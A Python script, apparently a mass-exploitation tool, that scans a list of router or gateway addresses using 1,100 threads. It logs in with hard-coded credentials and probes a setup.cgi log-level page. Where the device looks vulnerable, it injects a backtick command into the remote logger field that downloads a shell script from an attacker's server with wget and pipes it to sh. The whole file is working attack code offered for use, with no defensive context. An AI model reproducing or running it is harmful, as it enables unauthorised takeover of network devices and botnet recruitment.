# found and made by @fdbspy

import requests
from urllib3.exceptions import InsecureRequestWarning
import threading

# x
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# x
def send_first_request(ip_port):
    if ip_port.startswith('https://'):
        url = f'{ip_port}/'
    else:
        url = f'http://{ip_port}/'

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
        'Connection': 'close'
    }
    data = 'username=user&password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'

    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=25)  # x
        return response
    except requests.exceptions.RequestException:
        return None

# x
def send_second_request(ip_port):
    if ip_port.startswith('https://'):
        setup_url = f'{ip_port}/cgi-bin/setup.cgi?page/management/mngt_loglevel.shtml'
    else:
        setup_url = f'http://{ip_port}/cgi-bin/setup.cgi?page/management/mngt_loglevel.shtml'

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
        'Connection': 'close'
    }

    try:
        response = requests.get(setup_url, headers=headers, verify=False, timeout=25)  # x
        return response.text
    except requests.exceptions.RequestException:
        return None

# x
def send_post_request(ip_port):
    if ip_port.startswith('https://'):
        url = f'{ip_port}/cgi-bin/setup.cgi?page/management/mngt_loglevel.shtml'
    else:
        url = f'http://{ip_port}/cgi-bin/setup.cgi?page/management/mngt_loglevel.shtml'

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
        'Connection': 'close'
    }
    data = 'InternetGatewayDevice.DeviceInfo.X_CT-COM_Syslog.Enable=1&InternetGatewayDevice.DeviceInfo.X_CT-COM_Syslog.Level=3&InternetGatewayDevice.X_CT-COM_Logger.LogTFTPServer=&InternetGatewayDevice.X_CT-COM_Logger.RemoteLogEnabled=1&InternetGatewayDevice.X_CT-COM_Logger.RemoteLogger=1.1.1.1`wget+http%3a//SERVER IP/wget.sh+-O-|sh`&InternetGatewayDevice.X_CT-COM_Logger.RemotePort=514'

    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=25)  # Set timeout to 5 seconds
        return response
    except requests.exceptions.RequestException:
        return None

# x
def process_ips(ips):
    for ip_port in ips:
        first_response = send_first_request(ip_port)
        if first_response:
            second_response_body = send_second_request(ip_port)
            if second_response_body and "The CGI process took too long to produce a response" in second_response_body:
                print(f"[*] vulnerability found: {ip_port}")
                send_post_request(ip_port)
                print(f"[+] payload sent: {ip_port}")

if __name__ == "__main__":
    # x
    with open('ips.txt', 'r') as file:
        ips = file.read().splitlines()

    # x
    num_threads = 1100  # x

    # x
    chunk_size = (len(ips) + num_threads - 1) // num_threads
    chunks = [ips[i:i+chunk_size] for i in range(0, len(ips), chunk_size)]

    # x
    threads = []
    for chunk in chunks:
        thread = threading.Thread(target=process_ips, args=(chunk,))
        thread.start()
        threads.append(thread)

    # x
    for thread in threads:
        thread.join()
